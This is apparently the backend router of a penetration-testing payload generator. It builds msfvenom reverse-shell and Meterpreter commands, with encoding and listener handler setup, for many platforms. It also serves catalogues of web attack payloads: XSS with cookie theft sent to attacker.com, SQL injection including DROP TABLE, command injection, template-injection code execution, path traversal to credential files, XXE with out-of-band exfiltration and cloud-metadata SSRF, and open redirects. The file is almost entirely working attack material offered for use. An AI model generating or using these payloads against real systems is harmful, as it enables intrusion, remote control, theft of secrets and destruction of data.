import { Router } from 'express';
import express from 'express';

const router = Router();

// ─── msfvenom templates ───────────────────────────────────────────────────────

const MSF_PAYLOADS = [
  // Linux
  { id: 'linux-x86-reverse-tcp',    os: 'Linux',   arch: 'x86',    format: 'elf',      payload: 'linux/x86/shell_reverse_tcp' },
  { id: 'linux-x64-reverse-tcp',    os: 'Linux',   arch: 'x64',    format: 'elf',      payload: 'linux/x64/shell_reverse_tcp' },
  { id: 'linux-x86-meterpreter',    os: 'Linux',   arch: 'x86',    format: 'elf',      payload: 'linux/x86/meterpreter/reverse_tcp' },
  { id: 'linux-x64-meterpreter',    os: 'Linux',   arch: 'x64',    format: 'elf',      payload: 'linux/x64/meterpreter/reverse_tcp' },
  // Windows
  { id: 'win-x86-reverse-tcp',      os: 'Windows', arch: 'x86',    format: 'exe',      payload: 'windows/shell_reverse_tcp' },
  { id: 'win-x64-reverse-tcp',      os: 'Windows', arch: 'x64',    format: 'exe',      payload: 'windows/x64/shell_reverse_tcp' },
  { id: 'win-x86-meterpreter',      os: 'Windows', arch: 'x86',    format: 'exe',      payload: 'windows/meterpreter/reverse_tcp' },
  { id: 'win-x64-meterpreter',      os: 'Windows', arch: 'x64',    format: 'exe',      payload: 'windows/x64/meterpreter/reverse_tcp' },
  { id: 'win-x86-meterpreter-https',os: 'Windows', arch: 'x86',    format: 'exe',      payload: 'windows/meterpreter/reverse_https' },
  { id: 'win-x64-meterpreter-https',os: 'Windows', arch: 'x64',    format: 'exe',      payload: 'windows/x64/meterpreter/reverse_https' },
  { id: 'win-powershell',           os: 'Windows', arch: 'x64',    format: 'psh-cmd',  payload: 'windows/x64/powershell_reverse_tcp' },
  { id: 'win-x86-dll',              os: 'Windows', arch: 'x86',    format: 'dll',      payload: 'windows/shell_reverse_tcp' },
  { id: 'win-x64-dll',              os: 'Windows', arch: 'x64',    format: 'dll',      payload: 'windows/x64/shell_reverse_tcp' },
  // macOS
  { id: 'macos-x64-reverse-tcp',    os: 'macOS',   arch: 'x64',    format: 'macho',    payload: 'osx/x64/shell_reverse_tcp' },
  { id: 'macos-x64-meterpreter',    os: 'macOS',   arch: 'x64',    format: 'macho',    payload: 'osx/x64/meterpreter/reverse_tcp' },
  // Android
  { id: 'android-meterpreter',      os: 'Android', arch: 'dalvik', format: 'apk',      payload: 'android/meterpreter/reverse_tcp' },
  // Web / scripted
  { id: 'php-reverse-tcp',          os: 'PHP',     arch: 'any',    format: 'raw',      payload: 'php/reverse_php' },
  { id: 'python-reverse-tcp',       os: 'Python',  arch: 'any',    format: 'raw',      payload: 'python/shell_reverse_tcp' },
  { id: 'java-jsp',                 os: 'Java',    arch: 'any',    format: 'jsp',      payload: 'java/jsp_shell_reverse_tcp' },
  { id: 'java-war',                 os: 'Java',    arch: 'any',    format: 'war',      payload: 'java/jsp_shell_reverse_tcp' },
  // Shellcode
  { id: 'win-x86-shellcode',        os: 'Windows', arch: 'x86',    format: 'c',        payload: 'windows/shell_reverse_tcp' },
  { id: 'win-x64-shellcode',        os: 'Windows', arch: 'x64',    format: 'c',        payload: 'windows/x64/shell_reverse_tcp' },
  { id: 'linux-x86-shellcode',      os: 'Linux',   arch: 'x86',    format: 'c',        payload: 'linux/x86/shell_reverse_tcp' },
];

const ENCODERS = [
  { id: 'none',                   label: 'None (no encoding)' },
  { id: 'x86/shikata_ga_nai',     label: 'x86/shikata_ga_nai (polymorphic XOR additive feedback)' },
  { id: 'x64/xor',                label: 'x64/xor (XOR)' },
  { id: 'x64/xor_dynamic',        label: 'x64/xor_dynamic' },
  { id: 'x86/xor_dynamic',        label: 'x86/xor_dynamic' },
  { id: 'generic/none',           label: 'generic/none' },
];

const IP_REGEX = /^(\d{1,3}\.){3}\d{1,3}$|^[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/;
const PORT_REGEX = /^\d{1,5}$/;

function buildMsfCommand({ payload, lhost, lport, format, encoder, iterations, badchars, outputFile }) {
  const parts = [
    'msfvenom',
    `-p ${payload.payload}`,
    `LHOST=${lhost}`,
    `LPORT=${lport}`,
    `-f ${payload.format}`,
  ];
  if (encoder && encoder !== 'none') {
    parts.push(`-e ${encoder}`);
    parts.push(`-i ${iterations || 1}`);
  }
  if (badchars && badchars.trim()) {
    parts.push(`-b '${badchars.trim()}'`);
  }
  const file = outputFile || `payload.${payload.format}`;
  parts.push(`-o ${file}`);
  return parts.join(' ');
}

// ─── web payloads ─────────────────────────────────────────────────────────────

const WEB_CATEGORIES = {
  xss: {
    label: 'XSS',
    payloads: [
      { id: 'xss-basic',          label: 'Basic script tag',               payload: '<script>alert(1)</script>' },
      { id: 'xss-img-onerror',    label: 'img onerror',                    payload: '<img src=x onerror=alert(1)>' },
      { id: 'xss-svg',            label: 'SVG onload',                     payload: '<svg onload=alert(1)>' },
      { id: 'xss-body-onload',    label: 'body onload',                    payload: '<body onload=alert(1)>' },
      { id: 'xss-iframe',         label: 'iframe srcdoc',                  payload: '<iframe srcdoc="<script>alert(1)</script>"></iframe>' },
      { id: 'xss-javascript',     label: 'javascript: URI',                payload: 'javascript:alert(1)' },
      { id: 'xss-input-autofocus',label: 'input autofocus onfocus',        payload: '<input autofocus onfocus=alert(1)>' },
      { id: 'xss-details',        label: 'details ontoggle',               payload: '<details ontoggle=alert(1) open>' },
      { id: 'xss-template',       label: 'template / content',             payload: '<template><script>alert(1)</script></template>' },
      { id: 'xss-data-uri',       label: 'data: URI iframe',               payload: '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>' },
      { id: 'xss-cookie',         label: 'Cookie exfil (edit URL)',        payload: '<script>fetch("https://attacker.com/?c="+document.cookie)</script>' },
      { id: 'xss-double-encode',  label: 'Double-encoded angle brackets',  payload: '%253Cscript%253Ealert(1)%253C/script%253E' },
      { id: 'xss-html-entity',    label: 'HTML entity encoded',            payload: '&lt;script&gt;alert(1)&lt;/script&gt;' },
    ],
  },
  sqli: {
    label: 'SQL Injection',
    payloads: [
      { id: 'sqli-auth-bypass',   label: 'Auth bypass (OR 1=1)',           payload: "' OR '1'='1" },
      { id: 'sqli-comment',       label: 'Comment out rest',               payload: "' OR 1=1--" },
      { id: 'sqli-union-2',       label: 'UNION 2-column',                 payload: "' UNION SELECT NULL,NULL--" },
      { id: 'sqli-union-3',       label: 'UNION 3-column',                 payload: "' UNION SELECT NULL,NULL,NULL--" },
      { id: 'sqli-version',       label: 'MySQL version',                  payload: "' UNION SELECT @@version,NULL--" },
      { id: 'sqli-tables',        label: 'List tables (MySQL)',             payload: "' UNION SELECT table_name,NULL FROM information_schema.tables--" },
      { id: 'sqli-columns',       label: 'List columns (MySQL)',           payload: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--" },
      { id: 'sqli-time-mysql',    label: 'Time-based blind (MySQL)',       payload: "' AND SLEEP(5)--" },
      { id: 'sqli-time-mssql',    label: 'Time-based blind (MSSQL)',       payload: "'; WAITFOR DELAY '0:0:5'--" },
      { id: 'sqli-time-pg',       label: 'Time-based blind (PostgreSQL)',  payload: "' AND 1=(SELECT 1 FROM pg_sleep(5))--" },
      { id: 'sqli-boolean',       label: 'Boolean blind (true)',           payload: "' AND 1=1--" },
      { id: 'sqli-boolean-false', label: 'Boolean blind (false)',          payload: "' AND 1=2--" },
      { id: 'sqli-stacked',       label: 'Stacked query',                  payload: "'; DROP TABLE users--" },
      { id: 'sqli-error-based',   label: 'Error-based (MySQL)',            payload: "' AND extractvalue(1,concat(0x7e,version()))--" },
    ],
  },
  cmdi: {
    label: 'Command Injection',
    payloads: [
      { id: 'cmdi-semicolon',     label: 'Semicolon separator',            payload: '; id' },
      { id: 'cmdi-pipe',          label: 'Pipe operator',                  payload: '| id' },
      { id: 'cmdi-and',           label: 'AND operator',                   payload: '&& id' },
      { id: 'cmdi-or',            label: 'OR operator (error required)',   payload: '|| id' },
      { id: 'cmdi-backtick',      label: 'Backtick subshell',              payload: '`id`' },
      { id: 'cmdi-subshell',      label: 'Dollar subshell',                payload: '$(id)' },
      { id: 'cmdi-newline',       label: 'Newline bypass',                 payload: '%0Aid' },
      { id: 'cmdi-cr',            label: 'CRLF bypass',                    payload: '%0D%0Aid' },
      { id: 'cmdi-sleep',         label: 'Blind time-based (sleep)',       payload: '; sleep 5' },
      { id: 'cmdi-win',           label: 'Windows cmd separator',          payload: '& whoami' },
      { id: 'cmdi-win-pipe',      label: 'Windows pipe',                   payload: '| whoami' },
      { id: 'cmdi-out-of-band',   label: 'OOB DNS (edit domain)',          payload: '; nslookup attacker.com' },
    ],
  },
  ssti: {
    label: 'SSTI',
    payloads: [
      { id: 'ssti-jinja2-test',   label: 'Jinja2 / Twig detection',        payload: '{{7*7}}' },
      { id: 'ssti-jinja2-exec',   label: 'Jinja2 RCE',                     payload: "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode()}}" },
      { id: 'ssti-twig',          label: 'Twig RCE',                       payload: '{{["id"]|map("system")|join}}' },
      { id: 'ssti-freemarker',    label: 'FreeMarker detection',           payload: '${7*7}' },
      { id: 'ssti-freemarker-exec',label:'FreeMarker RCE',                 payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}' },
      { id: 'ssti-velocity',      label: 'Velocity detection',             payload: '#set($x=7*7)$x' },
      { id: 'ssti-erb',           label: 'ERB (Ruby) detection',           payload: '<%= 7*7 %>' },
      { id: 'ssti-erb-exec',      label: 'ERB RCE',                        payload: '<%= `id` %>' },
      { id: 'ssti-smarty',        label: 'Smarty detection',               payload: '{$smarty.version}' },
      { id: 'ssti-mako',          label: 'Mako detection',                 payload: '${7*7}' },
    ],
  },
  path: {
    label: 'Path Traversal',
    payloads: [
      { id: 'path-basic',         label: 'Basic Unix traversal',           payload: '../../../etc/passwd' },
      { id: 'path-win',           label: 'Windows traversal',              payload: '..\\..\\..\\windows\\win.ini' },
      { id: 'path-url-encoded',   label: 'URL encoded',                    payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd' },
      { id: 'path-double-encoded',label: 'Double URL encoded',             payload: '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd' },
      { id: 'path-null-byte',     label: 'Null byte truncation',           payload: '../../../etc/passwd%00.jpg' },
      { id: 'path-absolute',      label: 'Absolute path',                  payload: '/etc/passwd' },
      { id: 'path-win-absolute',  label: 'Windows absolute',               payload: 'c:\\windows\\win.ini' },
      { id: 'path-shadow',        label: '/etc/shadow',                    payload: '../../../etc/shadow' },
      { id: 'path-hosts',         label: '/etc/hosts',                     payload: '../../../etc/hosts' },
      { id: 'path-proc',          label: '/proc/self/environ',             payload: '../../../proc/self/environ' },
    ],
  },
  xxe: {
    label: 'XXE',
    payloads: [
      {
        id: 'xxe-basic',
        label: 'Basic file read (/etc/passwd)',
        payload:
`<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>`,
      },
      {
        id: 'xxe-win',
        label: 'Windows file read (win.ini)',
        payload:
`<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>`,
      },
      {
        id: 'xxe-ssrf',
        label: 'SSRF via XXE (edit URL)',
        payload:
`<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>`,
      },
      {
        id: 'xxe-oob',
        label: 'OOB exfil (edit attacker DTD URL)',
        payload:
`<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
<root>&send;</root>`,
      },
      {
        id: 'xxe-parameter',
        label: 'Parameter entity (blind)',
        payload:
`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % wrap "<!ENTITY send SYSTEM 'http://attacker.com/?data=%xxe;'>">
  %wrap;
]>
<foo>&send;</foo>`,
      },
    ],
  },
  openredirect: {
    label: 'Open Redirect',
    payloads: [
      { id: 'or-basic',           label: 'Basic external URL',             payload: 'https://evil.com' },
      { id: 'or-double-slash',    label: 'Protocol-relative',              payload: '//evil.com' },
      { id: 'or-encoded',         label: 'URL encoded',                    payload: '%68%74%74%70%73%3A%2F%2Fevil.com' },
      { id: 'or-double-encoded',  label: 'Double-encoded',                 payload: '%2568%2574%2574%2570%2573%253A%252F%252Fevil.com' },
      { id: 'or-backslash',       label: 'Backslash bypass',               payload: '\\\\evil.com' },
      { id: 'or-at',              label: '@ bypass',                       payload: 'https://legit.com@evil.com' },
      { id: 'or-crlf',            label: 'CRLF injection',                 payload: '%0D%0ALocation: https://evil.com' },
      { id: 'or-data',            label: 'data: URI (XSS escalation)',     payload: 'data:text/html,<script>alert(1)</script>' },
      { id: 'or-javascript',      label: 'javascript: URI',                payload: 'javascript:alert(1)' },
      { id: 'or-subdomain',       label: 'Subdomain confusion',            payload: 'https://legit.com.evil.com' },
    ],
  },
};

// ─── Routes ──────────────────────────────────────────────────────────────────

router.get('/msf-payloads', (req, res) => {
  res.json({ payloads: MSF_PAYLOADS, encoders: ENCODERS });
});

router.post('/msf-generate', express.json({ limit: '10kb' }), (req, res) => {
  const { payloadId, lhost, lport, encoder, iterations, badchars, outputFile } = req.body || {};

  if (!payloadId || !lhost || !lport) {
    return res.status(400).json({ error: 'payloadId, lhost, and lport are required.' });
  }

  const payload = MSF_PAYLOADS.find(p => p.id === payloadId);
  if (!payload) {
    return res.status(400).json({ error: 'Unknown payloadId.' });
  }

  if (!IP_REGEX.test(lhost)) {
    return res.status(400).json({ error: 'Invalid lhost.' });
  }
  if (!PORT_REGEX.test(String(lport)) || parseInt(lport) < 1 || parseInt(lport) > 65535) {
    return res.status(400).json({ error: 'Invalid lport.' });
  }
  if (encoder && !ENCODERS.find(e => e.id === encoder)) {
    return res.status(400).json({ error: 'Unknown encoder.' });
  }
  if (iterations !== undefined && (typeof iterations !== 'number' || iterations < 1 || iterations > 20)) {
    return res.status(400).json({ error: 'iterations must be between 1 and 20.' });
  }
  if (badchars && typeof badchars !== 'string') {
    return res.status(400).json({ error: 'badchars must be a string.' });
  }
  if (outputFile && !/^[a-zA-Z0-9._-]+$/.test(outputFile)) {
    return res.status(400).json({ error: 'outputFile contains invalid characters.' });
  }

  const command = buildMsfCommand({ payload, lhost, lport: String(lport), encoder, iterations, badchars, outputFile });

  const handlerCommands = [
    `use exploit/multi/handler`,
    `set PAYLOAD ${payload.payload}`,
    `set LHOST ${lhost}`,
    `set LPORT ${lport}`,
    `run`,
  ];

  res.json({ command, payload, handlerCommands });
});

router.get('/web-categories', (req, res) => {
  const summary = Object.entries(WEB_CATEGORIES).map(([id, cat]) => ({
    id,
    label: cat.label,
    count: cat.payloads.length,
  }));
  res.json({ categories: summary });
});

router.get('/web-payloads/:category', (req, res) => {
  const cat = WEB_CATEGORIES[req.params.category];
  if (!cat) return res.status(404).json({ error: 'Unknown category.' });
  res.json({ category: req.params.category, label: cat.label, payloads: cat.payloads });
});

export default router;
